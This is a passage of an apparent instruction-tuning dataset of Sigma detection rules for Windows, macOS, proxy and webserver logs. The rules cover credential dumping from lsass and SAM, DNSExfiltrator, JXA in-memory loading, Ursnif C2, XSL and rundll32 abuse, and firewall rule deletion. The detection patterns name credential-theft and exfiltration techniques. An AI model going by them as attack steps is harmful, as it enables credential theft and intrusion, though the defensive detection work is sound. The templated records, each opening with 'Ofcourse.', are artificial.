    "instruction": "Build a Sigma rule with the goal of detecting known suspicious (default) user-agents related to scanning/recon tools.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect known suspicious (default) user-agents related to scanning/recon tools, you should: Monitor your webserver logs for any occurrences of specific user-agent strings that are commonly associated with scanning or reconnaissance tools. These include user-agent strings containing 'Wfuzz/', 'WPScan v', 'Recon-ng/v', or 'GIS - AppSec Team - Project Vision'. The detection of these strings may indicate an attempt to scan your webserver for vulnerabilities or gather information in preparation for an attack. It's important to note that while the identification of these user-agents can signal potentially malicious activity, there may also be unknown instances where these detections do not signify an actual threat. The severity level for these detections is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    selection:\n        cs-user-agent|contains:\n            # Add more tools as you see fit\n            - 'Wfuzz/'\n            - 'WPScan v'\n            - 'Recon-ng/v'\n            - 'GIS - AppSec Team - Project Vision'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    selection:\n        cs-user-agent|contains:\n            # Add more tools as you see fit\n            - 'Wfuzz/'\n            - 'WPScan v'\n            - 'Recon-ng/v'\n            - 'GIS - AppSec Team - Project Vision'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "known suspicious (default) user-agents related to scanning/recon tools",
      "answer": "In order to detect known suspicious (default) user-agents related to scanning/recon tools, you should: Monitor your webserver logs for any occurrences of specific user-agent strings that are commonly associated with scanning or reconnaissance tools. These include user-agent strings containing 'Wfuzz/', 'WPScan v', 'Recon-ng/v', or 'GIS - AppSec Team - Project Vision'. The detection of these strings may indicate an attempt to scan your webserver for vulnerabilities or gather information in preparation for an attack. It's important to note that while the identification of these user-agents can signal potentially malicious activity, there may also be unknown instances where these detections do not signify an actual threat. The severity level for these detections is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting uses of the SysInternals ProcDump utility in which ProcDump or its output get renamed, or a dump file is moved or copied to a different name.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect uses of the SysInternals ProcDump utility in which ProcDump or its output get renamed, or a dump file is moved or copied to a different name, you should: Focus on monitoring creation of processes in Windows environments. Look specifically for commands in the process creation logs that contain phrases indicative of actions such as 'copy procdump', 'move procdump', or manipulation of dump files, especially with patterns like copying or moving '.dmp' files, including specific references to '2.dmp', 'lsass', 'out.dmp', or actions involving 'lsass.exe_' as part of ProcDump's default naming convention for dump files (e.g., 'lsass.exe_220111_085234.dmp'). This detection strategy should be applied by analyzing if any one of these conditions is met during process execution. However, be aware that it is common to encounter false positives when ProcDump is simply being copied to a different directory without any file name changes. This activity is rated with a high level of importance due to potential implications.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains:\n            - 'copy procdump'\n            - 'move procdump'\n    selection_2:\n        CommandLine|contains|all:\n            - 'copy '\n            - '.dmp '\n        CommandLine|contains:\n            - '2.dmp'\n            - 'lsass'\n            - 'out.dmp'\n    selection_3:\n        CommandLine|contains:\n            - 'copy lsass.exe_'  # procdump default pattern e.g. lsass.exe_220111_085234.dmp\n            - 'move lsass.exe_'  # procdump default pattern e.g. lsass.exe_220111_085234.dmp\n    condition: 1 of selection_*\nfalsepositives:\n    - False positives are expected in cases in which ProcDump just gets copied to a different directory without any renaming\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains:\n            - 'copy procdump'\n            - 'move procdump'\n    selection_2:\n        CommandLine|contains|all:\n            - 'copy '\n            - '.dmp '\n        CommandLine|contains:\n            - '2.dmp'\n            - 'lsass'\n            - 'out.dmp'\n    selection_3:\n        CommandLine|contains:\n            - 'copy lsass.exe_'  # procdump default pattern e.g. lsass.exe_220111_085234.dmp\n            - 'move lsass.exe_'  # procdump default pattern e.g. lsass.exe_220111_085234.dmp\n    condition: 1 of selection_*\nfalsepositives:\n    - False positives are expected in cases in which ProcDump just gets copied to a different directory without any renaming\nlevel: high\n",
      "question": "uses of the SysInternals ProcDump utility in which ProcDump or its output get renamed, or a dump file is moved or copied to a different name",
      "answer": "In order to detect uses of the SysInternals ProcDump utility in which ProcDump or its output get renamed, or a dump file is moved or copied to a different name, you should: Focus on monitoring creation of processes in Windows environments. Look specifically for commands in the process creation logs that contain phrases indicative of actions such as 'copy procdump', 'move procdump', or manipulation of dump files, especially with patterns like copying or moving '.dmp' files, including specific references to '2.dmp', 'lsass', 'out.dmp', or actions involving 'lsass.exe_' as part of ProcDump's default naming convention for dump files (e.g., 'lsass.exe_220111_085234.dmp'). This detection strategy should be applied by analyzing if any one of these conditions is met during process execution. However, be aware that it is common to encounter false positives when ProcDump is simply being copied to a different directory without any file name changes. This activity is rated with a high level of importance due to potential implications."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting DNSExfiltrator allows for transferring (exfiltrate) a file over a DNS request covert channel.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to identify attempts to transfer files over a DNS request covert channel using DNSExfiltrator, you should monitor Windows PowerShell script logs, specifically focusing on Script Block Logging. This requires Script Block Logging to be enabled to capture the necessary details for analysis. Look for scripts containing the keyword 'Invoke-DNSExfiltrator', as this indicates the DNSExfiltrator tool is being employed. Additionally, scripts that include all the following parts: '-i', '-d', '-p', '-doh', and '-t' within their command lines should be scrutinized, as these flags are indicative of the configuration parameters typically used with DNSExfiltrator to specify the input file, domain, DNS server, use of DNS-over-HTTPS, and the type of record to be used for exfiltration, respectively. It's crucial to approach detection with high sensitivity due to the high impact of potential false positives, such as the legitimate use of similar scripts. Therefore, any detection should be followed by a thorough investigation to confirm malicious intent.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_cmdlet:\n        - ScriptBlockText|contains: 'Invoke-DNSExfiltrator'\n        - ScriptBlockText|contains|all:\n            - ' -i '\n            - ' -d '\n            - ' -p '\n            - ' -doh '\n            - ' -t '\n    condition: selection_cmdlet\nfalsepositives:\n    - Legitimate script\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_cmdlet:\n        - ScriptBlockText|contains: 'Invoke-DNSExfiltrator'\n        - ScriptBlockText|contains|all:\n            - ' -i '\n            - ' -d '\n            - ' -p '\n            - ' -doh '\n            - ' -t '\n    condition: selection_cmdlet\nfalsepositives:\n    - Legitimate script\nlevel: high\n",
      "question": "DNSExfiltrator allows for transferring (exfiltrate) a file over a DNS request covert channel",
      "answer": "In order to identify attempts to transfer files over a DNS request covert channel using DNSExfiltrator, you should monitor Windows PowerShell script logs, specifically focusing on Script Block Logging. This requires Script Block Logging to be enabled to capture the necessary details for analysis. Look for scripts containing the keyword 'Invoke-DNSExfiltrator', as this indicates the DNSExfiltrator tool is being employed. Additionally, scripts that include all the following parts: '-i', '-d', '-p', '-doh', and '-t' within their command lines should be scrutinized, as these flags are indicative of the configuration parameters typically used with DNSExfiltrator to specify the input file, domain, DNS server, use of DNS-over-HTTPS, and the type of record to be used for exfiltration, respectively. It's crucial to approach detection with high sensitivity due to the high impact of potential false positives, such as the legitimate use of similar scripts. Therefore, any detection should be followed by a thorough investigation to confirm malicious intent."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious SAM dump activity as cause by QuarksPwDump and other password dumpers.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious SAM dump activity as cause by QuarksPwDump and other password dumpers, you should:\n\nThis detection strategy is tailored for monitoring Windows systems, specifically targeting the events logged by the Kernel-General source within the system service. The focus of this monitoring is to identify potentially malicious activities related to the Security Accounts Manager (SAM) file being dumped, which is an attack vector commonly used by tools like QuarksPwDump and others to extract passwords from a Windows system.\n\nThe core of this detection approach revolves around looking for system logs generated by the 'Microsoft-Windows-Kernel-General' provider, specifically those with an event ID of 16. This event ID is critical as it often signifies operations that could be associated with the manipulation or unauthorized accessing of system-level files. The detection process is further refined by scanning the event logs for specific keywords that denote suspicious behavior. These criteria encompass paths or file names that include \u2018\\AppData\\Local\\Temp\\SAM-\u2019 followed by a \u2018.dmp\u2019 extension. This pattern suggests that an attempt to dump the SAM file, which contains sensitive user authentication data, is being made, typically to a temporary location from where an attacker might attempt to exfiltrate it.\n\nGiven the nature of these activities, any detection based on these parameters is treated with a high level of seriousness. However, it's important to consider that there might be unknown scenarios where legitimate system or administrative actions might inadvertently trigger these detection criteria, although these would generally be considered exceptions.\n\nIn summary, monitoring for and investigating events that match these criteria within Windows system logs can serve as an essential step in identifying and thwarting attempts to steal sensitive password information using dumpstering techniques.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\n    definition: The source of this type of event is Kernel-General\ndetection:\n    selection:\n        Provider_Name: Microsoft-Windows-Kernel-General\n        EventID: 16\n    keywords:\n        '|all':\n            - '\\AppData\\Local\\Temp\\SAM-'\n            - '.dmp'\n    condition: selection and keywords\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\n    definition: The source of this type of event is Kernel-General\ndetection:\n    selection:\n        Provider_Name: Microsoft-Windows-Kernel-General\n        EventID: 16\n    keywords:\n        '|all':\n            - '\\AppData\\Local\\Temp\\SAM-'\n            - '.dmp'\n    condition: selection and keywords\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious SAM dump activity as cause by QuarksPwDump and other password dumpers",
      "answer": "In order to detect suspicious SAM dump activity as cause by QuarksPwDump and other password dumpers, you should:\n\nThis detection strategy is tailored for monitoring Windows systems, specifically targeting the events logged by the Kernel-General source within the system service. The focus of this monitoring is to identify potentially malicious activities related to the Security Accounts Manager (SAM) file being dumped, which is an attack vector commonly used by tools like QuarksPwDump and others to extract passwords from a Windows system.\n\nThe core of this detection approach revolves around looking for system logs generated by the 'Microsoft-Windows-Kernel-General' provider, specifically those with an event ID of 16. This event ID is critical as it often signifies operations that could be associated with the manipulation or unauthorized accessing of system-level files. The detection process is further refined by scanning the event logs for specific keywords that denote suspicious behavior. These criteria encompass paths or file names that include \u2018\\AppData\\Local\\Temp\\SAM-\u2019 followed by a \u2018.dmp\u2019 extension. This pattern suggests that an attempt to dump the SAM file, which contains sensitive user authentication data, is being made, typically to a temporary location from where an attacker might attempt to exfiltrate it.\n\nGiven the nature of these activities, any detection based on these parameters is treated with a high level of seriousness. However, it's important to consider that there might be unknown scenarios where legitimate system or administrative actions might inadvertently trigger these detection criteria, although these would generally be considered exceptions.\n\nIn summary, monitoring for and investigating events that match these criteria within Windows system logs can serve as an essential step in identifying and thwarting attempts to steal sensitive password information using dumpstering techniques."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting possible malicious execution of JXA in-memory via OSAScript.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect possible malicious execution of JXA in-memory via OSAScript, you should: Monitor process creation logs on macOS devices for specific command line patterns that indicate an in-memory execution attempt using OSAScript. Specifically, look for process executions involving the 'osascript' command along with the '-e' argument followed by strings 'eval' and 'NSData.dataWithContentsOfURL'. Additionally, be attentive to command lines indicating the use of '-l JavaScript' or the presence of '.js' files, as these could signify the execution or involvement of JavaScript code, potentially for malicious purposes. Any processes matching these patterns should be scrutinized. The detection of such activities requires vigilance due to the high threat level, although be aware of potential unknown false positives. This strategy revolves around intercepting and analyzing commands that might be exploiting JavaScript for Automation (JXA) to execute malicious scripts or commands in memory, which is a sophisticated technique often used by attackers to evade detection mechanisms on macOS systems.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: macos\n    category: process_creation\ndetection:\n    selection_main:\n        CommandLine|contains|all:\n            - 'osascript'\n            - ' -e '\n            - 'eval'\n            - 'NSData.dataWithContentsOfURL'\n    selection_js:\n        - CommandLine|contains|all:\n            - ' -l '\n            - 'JavaScript'\n        - CommandLine|contains: '.js'\n    condition: all of selection_*\nfields:\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: macos\n    category: process_creation\ndetection:\n    selection_main:\n        CommandLine|contains|all:\n            - 'osascript'\n            - ' -e '\n            - 'eval'\n            - 'NSData.dataWithContentsOfURL'\n    selection_js:\n        - CommandLine|contains|all:\n            - ' -l '\n            - 'JavaScript'\n        - CommandLine|contains: '.js'\n    condition: all of selection_*\nfields:\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "possible malicious execution of JXA in-memory via OSAScript",
      "answer": "In order to detect possible malicious execution of JXA in-memory via OSAScript, you should: Monitor process creation logs on macOS devices for specific command line patterns that indicate an in-memory execution attempt using OSAScript. Specifically, look for process executions involving the 'osascript' command along with the '-e' argument followed by strings 'eval' and 'NSData.dataWithContentsOfURL'. Additionally, be attentive to command lines indicating the use of '-l JavaScript' or the presence of '.js' files, as these could signify the execution or involvement of JavaScript code, potentially for malicious purposes. Any processes matching these patterns should be scrutinized. The detection of such activities requires vigilance due to the high threat level, although be aware of potential unknown false positives. This strategy revolves around intercepting and analyzing commands that might be exploiting JavaScript for Automation (JXA) to execute malicious scripts or commands in memory, which is a sophisticated technique often used by attackers to evade detection mechanisms on macOS systems."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Ursnif C2 traffic..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect Ursnif C2 traffic, you should monitor traffic through your proxy logs for specific patterns indicating malicious activity. Specifically, look for URLs or Uniform Resource Identifiers (URIs) in the traffic that contain patterns indicative of base64 encoding, such as '_2f' and '_2b' sequences. Additionally, pay close attention to URLs containing '.avi' file extensions within a '/images/' directory path, as these are part of the detection criteria. Both conditions involving base64 encoded segments and suspicious URL patterns need to be met for an alert to be triggered.\n\nIn your analysis, focus on fields including the client IP address (c-ip), the full requested URI (c-uri), server response size in bytes (sc-bytes), and the client's User-Agent string (c-ua) to gather more context about the suspicious traffic. It's important to note that while these detections are crucial, the possibility of encountering unknown false positive instances exists due to the broad nature of the detection rules. This detection is considered critical due to its association with the Ursnif C2 traffic, a known malicious operation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    b64encoding:\n        c-uri|contains:\n            - '_2f'\n            - '_2b'\n    urlpatterns:\n        c-uri|contains|all:\n            - '.avi'\n            - '/images/'\n    condition: b64encoding and urlpatterns\nfields:\n    - c-ip\n    - c-uri\n    - sc-bytes\n    - c-ua\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    b64encoding:\n        c-uri|contains:\n            - '_2f'\n            - '_2b'\n    urlpatterns:\n        c-uri|contains|all:\n            - '.avi'\n            - '/images/'\n    condition: b64encoding and urlpatterns\nfields:\n    - c-ip\n    - c-uri\n    - sc-bytes\n    - c-ua\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "Ursnif C2 traffic.",
      "answer": "In order to detect Ursnif C2 traffic, you should monitor traffic through your proxy logs for specific patterns indicating malicious activity. Specifically, look for URLs or Uniform Resource Identifiers (URIs) in the traffic that contain patterns indicative of base64 encoding, such as '_2f' and '_2b' sequences. Additionally, pay close attention to URLs containing '.avi' file extensions within a '/images/' directory path, as these are part of the detection criteria. Both conditions involving base64 encoded segments and suspicious URL patterns need to be met for an alert to be triggered.\n\nIn your analysis, focus on fields including the client IP address (c-ip), the full requested URI (c-uri), server response size in bytes (sc-bytes), and the client's User-Agent string (c-ua) to gather more context about the suspicious traffic. It's important to note that while these detections are crucial, the possibility of encountering unknown false positive instances exists due to the broad nature of the detection rules. This detection is considered critical due to its association with the Ursnif C2 traffic, a known malicious operation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. Rule detects when adversaries abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when adversaries abuse Extensible Stylesheet Language (XSL) files to execute arbitrary files while potentially bypassing application whitelisting defenses, you should: Monitor Windows process creation logs for the execution of `wmic.exe` or `msxsl.exe`. Specifically, look for instances where `wmic.exe` is being invoked with command line arguments including `/format` or `-format`, indicative of an attempt to manipulate or query WMI (Windows Management Instrumentation) in a suspicious manner, which could be related to the execution of arbitrary files. These command line arguments are typically used to format output but might be misused in an attack scenario. False positives may arise if the command line contains common format values like 'Format:List', 'Format:htable', and similar, so such instances should be excluded from alerts. Additionally, pay attention to the execution of `msxsl.exe`, which is not installed by default on Windows systems and thus its presence or usage should be considered suspicious. Acknowledge that false positives for WMIC usage could depend on the legitimate administrative scripts and methods used within your environment. The detection strategy is of medium urgency and aims to cover tactics and techniques including execution of arbitrary code, evasion of application whitelisting, and potentially, the abuse of system administration tools for malicious purposes.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_wmic:\n        Image|endswith: '\\wmic.exe'\n        CommandLine|contains: \n            - '/format'     # wmic process list /FORMAT /?\n            - '-format'     # wmic process list -FORMAT /?\n    selection_msxsl:\n        Image|endswith: '\\msxsl.exe'\n    false_positives:\n        CommandLine|contains:\n            - 'Format:List'\n            - 'Format:htable'\n            - 'Format:hform'\n            - 'Format:table'\n            - 'Format:mof'\n            - 'Format:value'\n            - 'Format:rawxml'\n            - 'Format:xml'\n            - 'Format:csv'\n    condition: (selection_wmic and not false_positives) or selection_msxsl\nfalsepositives:\n    - WMIC.exe FP depend on scripts and administrative methods used in the monitored environment.\n    - Msxsl.exe is not installed by default, so unlikely.\n    - Static format arguments - https://petri.com/command-line-wmi-part-3\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_wmic:\n        Image|endswith: '\\wmic.exe'\n        CommandLine|contains: \n            - '/format'     # wmic process list /FORMAT /?\n            - '-format'     # wmic process list -FORMAT /?\n    selection_msxsl:\n        Image|endswith: '\\msxsl.exe'\n    false_positives:\n        CommandLine|contains:\n            - 'Format:List'\n            - 'Format:htable'\n            - 'Format:hform'\n            - 'Format:table'\n            - 'Format:mof'\n            - 'Format:value'\n            - 'Format:rawxml'\n            - 'Format:xml'\n            - 'Format:csv'\n    condition: (selection_wmic and not false_positives) or selection_msxsl\nfalsepositives:\n    - WMIC.exe FP depend on scripts and administrative methods used in the monitored environment.\n    - Msxsl.exe is not installed by default, so unlikely.\n    - Static format arguments - https://petri.com/command-line-wmi-part-3\nlevel: medium\n",
      "question": "Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. Rule detects when adversaries abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses.",
      "answer": "In order to detect when adversaries abuse Extensible Stylesheet Language (XSL) files to execute arbitrary files while potentially bypassing application whitelisting defenses, you should: Monitor Windows process creation logs for the execution of `wmic.exe` or `msxsl.exe`. Specifically, look for instances where `wmic.exe` is being invoked with command line arguments including `/format` or `-format`, indicative of an attempt to manipulate or query WMI (Windows Management Instrumentation) in a suspicious manner, which could be related to the execution of arbitrary files. These command line arguments are typically used to format output but might be misused in an attack scenario. False positives may arise if the command line contains common format values like 'Format:List', 'Format:htable', and similar, so such instances should be excluded from alerts. Additionally, pay attention to the execution of `msxsl.exe`, which is not installed by default on Windows systems and thus its presence or usage should be considered suspicious. Acknowledge that false positives for WMIC usage could depend on the legitimate administrative scripts and methods used within your environment. The detection strategy is of medium urgency and aims to cover tactics and techniques including execution of arbitrary code, evasion of application whitelisting, and potentially, the abuse of system administration tools for malicious purposes."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting processes setting a new DLL in DllName in under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nAdversaries may abuse time providers to execute DLLs when the system boots.\nThe Windows Time service (W32Time) enables time synchronization across and within domains.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect processes setting a new DLL in DllName under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider, as adversaries may abuse time providers to execute DLLs when the system boots, you should: Focus on monitoring registry set actions within Windows systems, specifically looking at events where the type is SetValue. This involves scrutinizing any changes made to the \u2018DllName\u2019 fields that start with 'HKLM\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders' and end with 'DllName'. It is crucial to exclude any events that specifically alter the Details to \u2018C:\\Windows\\SYSTEM32\\w32time.DLL\u2019 as this is considered a legitimate action and not part of this targeted detection process. No known false positives have been identified, indicating the high specificity of the conditions outlined, which underscores the importance of this monitoring in securing against adversaries exploiting the Windows Time service for malicious DLL execution as part of their initial access strategy or persistence mechanisms.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|startswith: 'HKLM\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders'\n        TargetObject|endswith: 'DllName'\n    filter:\n        Details: 'C:\\Windows\\SYSTEM32\\w32time.DLL'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|startswith: 'HKLM\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders'\n        TargetObject|endswith: 'DllName'\n    filter:\n        Details: 'C:\\Windows\\SYSTEM32\\w32time.DLL'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "processes setting a new DLL in DllName in under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nAdversaries may abuse time providers to execute DLLs when the system boots.\nThe Windows Time service (W32Time) enables time synchronization across and within domains.\n",
      "answer": "In order to detect processes setting a new DLL in DllName under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider, as adversaries may abuse time providers to execute DLLs when the system boots, you should: Focus on monitoring registry set actions within Windows systems, specifically looking at events where the type is SetValue. This involves scrutinizing any changes made to the \u2018DllName\u2019 fields that start with 'HKLM\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders' and end with 'DllName'. It is crucial to exclude any events that specifically alter the Details to \u2018C:\\Windows\\SYSTEM32\\w32time.DLL\u2019 as this is considered a legitimate action and not part of this targeted detection process. No known false positives have been identified, indicating the high specificity of the conditions outlined, which underscores the importance of this monitoring in securing against adversaries exploiting the Windows Time service for malicious DLL execution as part of their initial access strategy or persistence mechanisms."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of \"rundll32\" calling \"advpack.dll\" with potential obfuscated ordinal calls in order to leverage the \"RegisterOCX\" function.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of \"rundll32\" calling \"advpack.dll\" with potential obfuscated ordinal calls in order to leverage the \"RegisterOCX\" function, you should: monitor Windows process creation logs for the execution of \"rundll32.exe\". Specifically, look for processes where the image name ends with '\\rundll32.exe', the original file name is explicitly stated as 'RUNDLL32.EXE', and the command line contains the string 'rundll32'. Additionally, check for command lines that include the string 'advpack', indicating the invocation of \"advpack.dll\". Pay special attention to command lines containing both '#+' and '12', or '#-', as these could be indicators of obfuscated ordinal calls to \"RegisterOCX\" or similar functions. The detection parameters are rigorous due to the high level of threat this behavior represents, and the occurrence of false positives is considered unlikely.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n        - CommandLine|contains: 'rundll32'\n    selection_cli_dll:\n        CommandLine|contains: 'advpack'\n    selection_cli_ordinal:\n        - CommandLine|contains|all:\n            - '#+'\n            - '12'\n        - CommandLine|contains: '#-'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n        - CommandLine|contains: 'rundll32'\n    selection_cli_dll:\n        CommandLine|contains: 'advpack'\n    selection_cli_ordinal:\n        - CommandLine|contains|all:\n            - '#+'\n            - '12'\n        - CommandLine|contains: '#-'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "execution of \"rundll32\" calling \"advpack.dll\" with potential obfuscated ordinal calls in order to leverage the \"RegisterOCX\" function",
      "answer": "In order to detect execution of \"rundll32\" calling \"advpack.dll\" with potential obfuscated ordinal calls in order to leverage the \"RegisterOCX\" function, you should: monitor Windows process creation logs for the execution of \"rundll32.exe\". Specifically, look for processes where the image name ends with '\\rundll32.exe', the original file name is explicitly stated as 'RUNDLL32.EXE', and the command line contains the string 'rundll32'. Additionally, check for command lines that include the string 'advpack', indicating the invocation of \"advpack.dll\". Pay special attention to command lines containing both '#+' and '12', or '#-', as these could be indicators of obfuscated ordinal calls to \"RegisterOCX\" or similar functions. The detection parameters are rigorous due to the high level of threat this behavior represents, and the occurrence of false positives is considered unlikely."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting removal of a port or application rule in the Windows Firewall configuration using netsh.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the removal of a port or application rule in the Windows Firewall configuration using netsh, you should: Look for the creation of processes on Windows systems specifically invoking 'netsh.exe', either by the exact name in the Image path or by the OriginalFileName. Pay attention to commands that include both 'firewall' and 'delete' within the CommandLine to catch incidences where firewall rules are being altered. However, ensure to exclude any actions originating from 'Dropbox.exe' or containing 'name=Dropbox' in the command line, as these are marked as known exceptions. Be aware that legitimate administration activities or software installations and removals might trigger this detection, which has been classified with a medium level of urgency. This process is aligned with identifying and mitigating tactics where attackers might try to disable security measures by manipulating firewall rules.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\netsh.exe'\n        - OriginalFileName: 'netsh.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'firewall'\n            - 'delete '\n    filter_dropbox:\n        ParentImage|endswith: '\\Dropbox.exe'\n        CommandLine|contains: 'name=Dropbox'\n    condition: all of selection_* and not filter_dropbox\nfalsepositives:\n    - Legitimate administration activity\n    - Software installations and removal\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\netsh.exe'\n        - OriginalFileName: 'netsh.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'firewall'\n            - 'delete '\n    filter_dropbox:\n        ParentImage|endswith: '\\Dropbox.exe'\n        CommandLine|contains: 'name=Dropbox'\n    condition: all of selection_* and not filter_dropbox\nfalsepositives:\n    - Legitimate administration activity\n    - Software installations and removal\nlevel: medium\n",
      "question": "removal of a port or application rule in the Windows Firewall configuration using netsh",
      "answer": "In order to detect the removal of a port or application rule in the Windows Firewall configuration using netsh, you should: Look for the creation of processes on Windows systems specifically invoking 'netsh.exe', either by the exact name in the Image path or by the OriginalFileName. Pay attention to commands that include both 'firewall' and 'delete' within the CommandLine to catch incidences where firewall rules are being altered. However, ensure to exclude any actions originating from 'Dropbox.exe' or containing 'name=Dropbox' in the command line, as these are marked as known exceptions. Be aware that legitimate administration activities or software installations and removals might trigger this detection, which has been classified with a medium level of urgency. This process is aligned with identifying and mitigating tactics where attackers might try to disable security measures by manipulating firewall rules."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting possible remote connections to Silenttrinity c2.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a possible remote connections to Silenttrinity c2, you should: Focus on analyzing network connection logs specifically from Windows-based systems. Look for events where an application, identified by ending with the path '\\msbuild.exe', initiates a network connection. This particular application is significant as it is commonly leveraged in such remote connection attempts. However, not all network activities flagged via this application are of concern; therefore, refine your detection by excluding network connections that are made to the standard web ports 80 and 443. These exclusions are crucial as communications over these ports could be benign and are commonly used for legitimate web traffic, thus reducing the possibility of false positives. Despite potential unknown false positives, the identification of such network activities should be treated with a high level of scrutiny due to the associated risk of Silenttrinity c2 connections.",
    "context": "",
